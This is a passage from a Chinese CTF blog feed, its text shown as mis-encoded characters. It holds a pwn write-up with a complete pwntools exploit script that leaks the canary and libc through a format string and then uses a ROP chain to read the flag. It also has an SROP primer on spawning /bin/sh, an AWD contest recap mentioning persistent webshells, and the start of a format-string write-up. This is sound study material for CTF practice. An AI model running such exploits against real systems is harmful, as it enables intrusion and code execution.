ret2csuï¼Œè¿™ä¸ªæ–¹æ³•å¥—ä¸€ä¸‹æ¨¡æ¿å’Œå®¹æ˜“å°±å¯ä»¥æ‰§è¡Œäº†è¿™ä¸ªreadã€‚</p><p>â‘¡å»libcä¸­æ‰¾åˆ°rdxç›¸å…³çš„gadgetï¼Œè¿™æ˜¯å®˜æ–¹æ”¾å‡ºçš„wpçš„æ€è·¯ã€‚</p><p>â‘¢æˆ‘å¦è¾Ÿè¹Šå¾„ï¼Œå¼€è¾Ÿå‡ºç¬¬ä¸‰ç§æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥è®°ä¸€ä¸‹ï¼šåœ¨è°ƒç”¨<code>strcmp</code>å‡½æ•°çš„æ—¶å€™ï¼Œrdxçš„å€¼ä¼šå˜æˆä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä¸åŒå­—ç¬¦çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²å¯¹åº”ä½ç½®çš„<code>ascii</code>å€¼ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœæˆ‘è°ƒç”¨strcmp(â€œaaaâ€,â€abcâ€)çš„è¯ï¼Œç»“æŸçš„æ—¶å€™rdxçš„å€¼ä¸ºâ€™bâ€™ã€‚</p><p>è¿™é‡Œæˆ‘ç”¨äº†ç¬¬ä¸‰ç§æ–¹æ³•ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„payloadå°±æ˜¯è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/IvO5gMmzlTKrU6Z.png" alt="zjctf pwn1_6.png"></p><p>ç»§ç»­è¿è¡Œä¸‹å»å¯ä»¥å‘ç°readæˆåŠŸåœ°æŠŠæˆ‘æœ¬åœ°çš„flagæ–‡ä»¶è¯»åˆ°äº†æ ˆä¸Šé¢</p><p><img src="https://i.loli.net/2021/07/16/1zQqSBaEGswuAgp.png" alt="zjctf pwn1_7.png"></p><p>æœ€åä¸€æ­¥åº”è¯¥å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠé‚£ä¸ªåœ°æ–¹çš„å­—ç¬¦ä¸²putså‡ºæ¥ï¼Œå› ä¸ºåœ¨è°ƒè¯•å™¨é‡Œé¢æˆ‘ä»¬èƒ½çœ‹åˆ°è¿™ä¸ªflagï¼Œä½†æ˜¯æ‰“è¿œç¨‹çš„æ—¶å€™æˆ‘ä»¬è‚¯å®šè¦è¾“å‡ºå‡ºæ¥æ‰èƒ½çœ‹åˆ°è¿™ä¸²flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ã€payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p>æ€ä¹ˆè¯´å‘¢ï¼Ÿéš¾æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç¡®å®æ”¶è·å¾ˆå¤šï¼Œå¦‚æœæƒ³è¯•è¯•è¿™é¢˜çš„å¸ˆå‚…ä»¬å¯ä»¥ç›´æ¥è”ç³»æˆ‘qqæ‰¾æˆ‘è¦ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400943</span></span><br><span class="line">welcome=<span class="number">0x400726</span></span><br><span class="line">pop_rsi_pop=<span class="number">0x400941</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p\n%31$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;you?&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=(u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">op=puts_addr+<span class="number">0x898b0</span></span><br><span class="line">strcmp=puts_addr+<span class="number">0xff5c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©å¼€å§‹ä»¥å­¦ä¹ äº†èŠ±å¼çš„æ ˆæº¢å‡ºROPæ”»å‡»ï¼ŒBROPè¿™ä¸ªä¸œè¥¿æœ´å®æ— åä¸”ç”¨å¤„ä¸å¤§ï¼Œæ€æƒ³èƒ½äº†è§£ï¼Œä½†æ˜¯ç°åœ¨è°æ‰“ä¸ªpwnè¿˜ä¸ç»™elfå‘¢ï¼Œä¸ç»™libcæ–‡ä»¶éƒ½ä¼šè¢«å–·æ­»ï¼Œè¿˜æ•¢ä¸ç»™elfï¼Ÿå› æ­¤è·³è¿‡è¿™ä¸ªå­¦ä¹ ä¸€ä¸‹SROPã€‚</p><span id="more"></span><p>SROPä¸»è¦æ”»å‡»æ–¹å¼å°±æ˜¯é’ˆå¯¹linuxç³»ç»Ÿè°ƒç”¨çš„ä¸€ä¸ªå¼±ç‚¹è¿›è¡Œæ”»å‡»çš„ï¼Œåœ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šå‘å‡ºsignalæŒ‚èµ·æˆ‘ä»¬æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œå¹¶ä¸”ä¿å­˜ä¸Šä¸‹æ–‡ï¼ˆä¸Šä¸‹æ–‡å³æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼‰ï¼Œç„¶åè¿™ä¸ªä¸Šä¸‹æ–‡è¿˜æ˜¯ä»¥ä¸€ä¸ªç»“æ„ä½“çš„å½¢å¼å­˜åœ¨äºæ ˆé‡Œé¢çš„ã€‚æ­¤æ—¶ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œè¯´æ˜ç°åœ¨åœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œå®Œæˆç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ä¼šè¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„è¿”å›ï¼Œè¿™ä¸ªè¿”å›åˆè¦è°ƒç”¨15å·çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ¢å¤ä¸Šä¸‹æ–‡å¹¶ä¸”åˆ‡æ¢åˆ°ç”¨æˆ·æ€ã€‚è¿™æ ·å­ç³»ç»Ÿè°ƒç”¨çš„æ–¹æ³•æœ‰ä¸€ä¸ªå¼±ç‚¹å°±æ˜¯ï¼Œå¦‚æœæˆ‘æ§åˆ¶äº†æ ˆï¼Œåœ¨å®ƒæŒ‚èµ·çš„æ—¶å€™æˆ‘å·å·ä¿®æ”¹rip=syscall,rax=59(execeveçš„ç³»ç»Ÿè°ƒç”¨å·),rdi=â€/bin/shâ€,rsi=0,rdx=0ã€‚é‚£ä¹ˆåœ¨ç»“æŸç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™å°±ä¼šæ‰§è¡Œexeceve(â€œ/bin/shâ€)æ‰“å¼€ä¸€ä¸ªshellã€‚</p><p>åœ¨å°±æ˜¯è¯´åœ¨ç»“æŸç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ä¼šè¿›è¡Œè¿™ä¹ˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘æœ¬èº«æ²¡æœ‰ç³»ç»Ÿè°ƒç”¨è€Œè°ƒç”¨äº†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è¿˜ä¼šæŠŠæ ˆé¡¶çš„ä¸Šä¸‹æ–‡ç»™è¿”å›ï¼Œå½“ç„¶æ²¡æœ‰ç²¾å¿ƒæ„é€ è¿‡æ ˆè€Œç›´æ¥è°ƒç”¨è‚¯å®šæ˜¯ä¼šå‡ºé”™çš„ã€‚æ”»å‡»çš„æ—¶å€™æˆ‘å°±è®©å®ƒå‡†å¤‡å¥½dl_sigreturnçš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶ååœ¨é¢„æœŸçš„æ ˆé¡¶æ„é€ ä¸€ä¸ªåªæ‰§è¡Œexeceve(â€œ/bin/shâ€)çš„ä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å®Œæˆæ‰“å¼€shellçš„æ”»å‡»ã€‚</p><p>ä»¥ä¸Šéƒ½æ˜¯æˆ‘æ ¹æ®sropä»¥åŠä¸€äº›å¸ˆå‚…çš„èµ„æ–™è‡ªå·±ç†è§£çš„ï¼Œå¦‚æœ‰é”™è¯¯é‚£æŒºæ­£å¸¸çš„ï¼Œä¹Ÿè¯·å¸ˆå‚…ä»¬èƒ½æŒ‡å‡ºæˆ‘çš„é”™è¯¯ï¼Œæ„Ÿæ¿€ä¸å°½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021åä¸œå—èµ›åŒºå›½èµ›çº¿ä¸‹èµ›</title>
      <link href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©æ¥åˆ°äº†ç¦å·æ‰“awdçš„çº¿ä¸‹èµ›ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ‰“awdï¼Œæ”¶è·å¾ˆå¤šã€‚</p><span id="more"></span><p>å…ˆè¯´ä¸€ä¸‹å¤§ä½“çš„æ„Ÿæƒ³ï¼ŒawdçœŸçš„æ¯”ctfå¥½ç©å¤ªå¤šäº†ï¼Œawdèƒ½çœŸæ­£ä½“ä¼šåˆ°é‚£ä¹ˆå¤šç½‘ç»œå®‰å…¨çˆ±å¥½è€…ç›¸äº’ç½‘ç»œæ”»å‡»çš„é‚£ç§ä¹è¶£ã€‚</p><p>é¦–å…ˆå…¥åœºå¼€å§‹æ¯”èµ›çš„æ—¶å€™çœŸçš„æ˜¯å•¥ä¹Ÿä¸çŸ¥é“ï¼Œä¸è¿‡å¥½åœ¨æœ‰å­¦é•¿å¸¦é˜Ÿï¼Œå•¥ä¹Ÿä¸ä¼šçš„æˆ‘ç»ˆäºåœ¨ç¬¬ä¸‰è½®çš„æ—¶å€™è¿ä¸Šäº†è‡ªå·±çš„é¶æœºhhhã€‚å­¦é•¿æ˜¯æ‰“webçš„ï¼Œä½†æ˜¯åœ¨åœºçš„webå¸ˆå‚…éƒ½å¤ªå‰å®³äº†ï¼Œä¸Šçš„ä¸æ­»é©¬ä¸ä»…è®©æˆ‘ä»¬é˜Ÿçš„é¶æœºdownæœºè¿˜ä¸åœåœ°æ‹¿flagï¼Œç”šè‡³æœ€ååˆ åº“éƒ½é˜»æ­¢ä¸äº†ä»–ä»¬æ‹¿flagã€‚</p><p>å’±ä»¬ç¬¬ä¸€å¤©çš„webä¸‰é¢˜æœ‰ä¸€é¢˜ä¸åœåœ°downæœºåˆè¢«æ‰“ï¼Œåœ¨ä¸‹åˆï¼Œä¹Ÿæ˜¯ç¬¬24ï¼Œ25è½®çš„æ—¶å€™æœ‰äººddosé¢˜ç›®è®©æ‰€æœ‰äººéƒ½downæœºäº†ï¼Œä¸»åŠæ–¹é‡å¯ç¯å¢ƒè¿˜æ¢å¤äº†é…ç½®ï¼Œè¿™å¯ä»¥è¯´æ˜¯è®©æˆ‘ä»¬æ¡äº†ä¸€ä¸ªæ¼ï¼Œå› ä¸ºç›¸å½“äºæ˜¯å¸®æˆ‘ä»¬ä¿®å¥½äº†ç¯å¢ƒï¼Œé¢˜ç›®ä¸Šçº¿çš„æ—¶å€™æœæ–­åˆ åº“ï¼ŒåŠæ—¶ä¿ä½äº†ä¸€äº›åˆ†ï¼Œä¸æ­¤åŒæ—¶é€šè¿‡æŸ¥æµé‡ä»¥åŠä¸åœåœ°æµ‹è¯•ä¹Ÿæ˜¯æŠŠpwné¢˜çš„payloadç»™æ‹¿åˆ°äº†ï¼Œå› ä¸ºæ•´ä¸ªpwné¢˜çš„è¾“å…¥å°±æ˜¯ä¸€ä¸ª0x2000å­—èŠ‚çš„readï¼ŒæŸ¥æµé‡ä¹Ÿä¸æ˜¯å¾ˆéš¾ã€‚ä½†æ˜¯ç”±äºå¸ˆå‚…ä»¬ä¸Šåˆå°±pwnå‡ºäº†ç¬¬ä¸€é“ï¼Œæˆ‘ä¹Ÿæ˜¯åœ¨ä¸åœåœ°å µpwnçš„æ¼æ´ï¼Œåˆ°æœ€åç»™è‡ªå·±å¼„downæœºäº†ï¼Œåˆ åº“è¿˜æ˜¯æ²¡ç”¨ï¼Œä¾ç„¶è¢«æ‰“ï¼Œæ‰€ä»¥ä¸‹åˆæˆ‘æ‰“ç®—ä¸è¡¥pwné¢˜è®©ä»–ä»¬éšä¾¿æ‰“äº†ï¼Œè¿™æ³¢è‡³å°‘èµšäº†å‡ åƒåˆ†ã€‚</p><p>ç¬¬äºŒå¤©çš„pwnä¸¤é¢˜éƒ½å¾ˆç®€å•ï¼Œä¾ç„¶æŸ¥æµé‡åŒ…æŠ„çš„payloadæ‹¿ä¸‹äº†å¤§éƒ¨åˆ†é˜Ÿä¼çš„pwnåˆ†æ•°ï¼Œä¿®æ´çš„æ—¶å€™åˆä¸å°å¿ƒdownäº†ï¼Œè¿˜è¢«æ‰“ï¼Œæˆ‘å°±åˆåˆ åº“ï¼Œå¯æ˜¯è¿˜æ˜¯æœ‰äººæ‰“ï¼Œç»“æœæœ€åå°±æ˜¯ç¯å¢ƒæ¢å¤ä¸äº†ï¼Œå…¨åœºå°±å’±ä»¬é˜Ÿoopé‚£é“pwné¢˜downäº†ã€‚æœ€å…³é”®æ˜¯downå°±downäº†ï¼Œè¿˜æœ‰äººæ‰“å°±æ— è¯­äº†ã€‚ã€‚å”¯ä¸€çš„ä¸€é“webé¢˜ä¾ç„¶ä¸­äº†ä¸æ­»é©¬å¯¼è‡´åˆdownåˆè¢«æ‰“ï¼Œæ¯è½®ç¨³å®šæ‰£500åˆ†(web åˆdownåˆè¢«æ‰“ï¼Œpwn1åˆdownåˆè¢«æ‰“ï¼Œpwn2ä¸€ç›´è¢«æ‰“)ï¼Œè¿˜å¥½pwn å¤šæ•°é˜Ÿä¼æ²¡æœ‰è¡¥ï¼Œæœ€åŸºæœ¬çš„å‡ ç™¾åˆ†è¿˜æ˜¯èƒ½å¡«ä¸Šå‘çš„ã€‚ä¸Šåˆä»rk40å†²è¿›äº†rk33ï¼Œrk33æ˜¯ç¨³ç¨³åœ°ä¸‰ç­‰å¥–ï¼Œä½†æ˜¯è‡ªä»å°‘æ•°å¸ˆå‚…ä¿®å¥½äº†pwné¢˜å±€åŠ¿å°±å¼€å§‹ä¸å¦™äº†ï¼Œæœ¬æ¥æˆ‘æ‰“æ­»ä¸æƒ³ä¿®çš„ï¼Œä½†æ˜¯çœ‹åˆ°æœ‰äº›é˜Ÿä¼ä¿®æˆåŠŸäº†æˆ‘ä¸ç¦åˆè¢«è¯±æƒ‘äº†ï¼Œä½†æ˜¯ç»“æœè¿˜æ˜¯ä¸éšäººæ„¿ã€‚æ‰€ä»¥pwn2æˆ‘å°±æ²¡æœ‰å»ä¿®äº†ã€‚æœ€ç»ˆæ¦œä¸Šrk36ï¼Œé‚£éƒ½æ˜¯éå¸¸å¡å¥–é¡¹çš„ä¸€ä¸ªä½ç½®ã€‚å› ä¸ºä¸‰ç­‰å¥–æ˜¯40%-60%ã€‚é¦–å…ˆå¾—åˆšå¥½60%*60é˜Ÿ=36é˜Ÿã€‚ä½†æ˜¯æœ‰é˜Ÿä¼æ²¡å»æ¯”èµ›è¦æ‰£åé¢å°±æ¯”è¾ƒå±é™©äº†ã€‚æœ€ç»ˆä¸çŸ¥æ˜¯ä¸»åŠæ–¹è¿˜æ˜¯æŒ‰ç…§60é˜Ÿ60%æ¯”ä¾‹ç®—äº†è¿˜æ˜¯å‰é¢é˜Ÿä¼æœ‰äººddosæˆ–è€…ä¸Šé€šé˜²è¢«æŸ¥äº†æˆ‘ä»¬è¿˜æ˜¯å¾ˆå¹¸è¿åœ°æŒ¤è¿›äº†ä¸‰ç­‰å¥–çš„æœ€åä¸€ä¸ªåé¢ï¼Œè¿™æ˜¯æœ€æœ€æœ€å¼€å¿ƒçš„ã€‚</p><p>å½“ç„¶æœ¬æ¬¡çº¿ä¸‹awdæ”¶è·çš„ç»éªŒä¹Ÿæ˜¯éå¸¸å¤šçš„ï¼Œæ¯”å¦‚å‰é¢å¤ç›˜ä»‹ç»çš„pwné¢˜è¢«check down çš„åŸå› æ˜¯:æœªç»™æƒé™ï¼Œä¹Ÿæ˜¯linuxåŸºç¡€ä¸ç‰¢å§ã€‚å‰å‡ æ¬¡patchçš„elfæ–‡ä»¶å®ˆä½äº†ä¸¤è½®ï¼Œä¹‹åè¿˜æ˜¯è¢«æ‰“ã€‚æ˜¨æ™šæˆ‘è‹¦æ€å†¥æƒ³æƒ³äº†å¾ˆä¹…ï¼Œé—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œæœ€ç»ˆN0viceå¸ˆå‚…ä¸€è¯­ç‚¹é€šäº†å‘ç”Ÿçš„ä¸€åˆ‡è‡ªå·±è§£é‡Šä¸äº†çš„äº‹ã€‚ç¬¬ä¸€æ¬¡patchçš„elfæ–‡ä»¶æ˜¯ç›´æ¥è¦†ç›–çš„ï¼Œå› æ­¤æƒé™ç»´æŒç›¸åŒï¼Œå¹¶ä¸”å¾ˆå¤šå¸ˆå‚…æ‹¿é€šç”¨è„šæœ¬æ‰“ä¸é€šæˆ‘çš„é¶æœºï¼Œæœºå­ä¹Ÿæ²¡æœ‰check downã€‚åæ¥è¢«æ‰“æ˜¯å› ä¸ºçœŸçš„æœ‰äººæ— èŠå¼€å§‹æ‹¿payloadç›´æ¥nc å»è¿æ¥ç»´æŒä¸€ä¸ªshellæƒé™ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¢«æ‰“é€šäº†æ¥ç€æ¢æ–¹å¼patchï¼Œæ®Šä¸çŸ¥é¶æœºä¸Šé¢åˆå‡ é¡µçš„shellè¿›ç¨‹ç•™åœ¨é‚£è¾¹ï¼Œè¿™æ˜¯æˆ‘çœŸæ²¡æƒ³åˆ°çš„ã€‚æˆ‘è¿˜ä»¥ä¸ºæ˜¯æˆ‘patchçš„æœ‰é—®é¢˜ï¼Œå°±åˆ æ–‡ä»¶ä¸Šä¼ ï¼Œç»“æœæƒé™ä¸å¤Ÿå¯¼è‡´æ— æ³•é€šè¿‡check downï¼Œä¸æ­¤åŒæ—¶è¿˜æœ‰é˜Ÿä¼ç•™äº†shellè¿›ç¨‹ä¸€ç›´è¢«æ‰“ã€‚</p><p>awdæ¯”èµ›çœŸçš„å¤ªå¥½ç©äº†ï¼ŒæœŸå¾…ä¸‹æ¬¡çš„awdæ¯”èµ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axb_2019_fmt32 wp</title>
      <link href="/2021/06/08/axb_2019_fmt32%20wp/"/>
      <url>/2021/06/08/axb_2019_fmt32%20wp/</url>
      
        <content type="html"><![CDATA[<p>ä¸´è¿‘æœŸæœ«è€ƒè¯•äº†ï¼Œç»ˆäºå¯ä»¥å…‰æ˜æ­£å¤§åœ°æ°´åšå®¢äº†ã€‚</p><span id="more"></span><p>æœ€è¿‘åˆšå†™ä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œè¿™ä¸ï¼Œä»–æ¥äº†ã€‚è¿™ä¸ªé¢˜ç›®æˆ‘åšè¿‡ä¹‹åæ„Ÿè§‰éš¾åº¦è¿˜æ˜¯æœ‰çš„ï¼Œåšå‡ºè¿™ä¸€é¢˜è‡³å°‘å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰ä¸€ä¸ªè¾ƒæ·±çš„ç†è§£äº†çš„ã€‚å®ƒç»¼åˆè€ƒå¯Ÿäº†<code>ret2libc</code>å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä»»æ„å†™ï¼Œä»¥åŠå¯¹gotè¡¨çš„ç†è§£ã€‚</p><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt32">axb_2019_fmt32</a></h2><p>ä¸‹è½½æ–‡ä»¶ï¼Œåæ±‡ç¼–æ‰“å¼€ï¼Œå†åç¼–è¯‘<code>main()</code>å‡½æ•°å¾—åˆ°å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span 